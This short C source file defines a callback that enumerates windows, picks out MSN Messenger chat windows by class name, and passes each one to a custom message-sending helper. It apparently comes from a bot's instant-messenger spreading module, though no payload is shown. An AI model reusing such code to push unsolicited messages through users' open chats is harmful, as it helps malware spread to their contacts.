#include "../Includes.h"

#ifndef NO_MSN

BOOL CALLBACK Msn(HWND hwnd, LPARAM lpParam)
{
	int iWindow = 0;
	char szClassName[50] = {0};

	GetClassName(hwnd, szClassName, sizeof(szClassName));
	if(!strcmp(szClassName, "IMWindowClass"))
		iWindow = 1;

	SendMessage(hwnd, iWindow);

    return TRUE;
}
#endif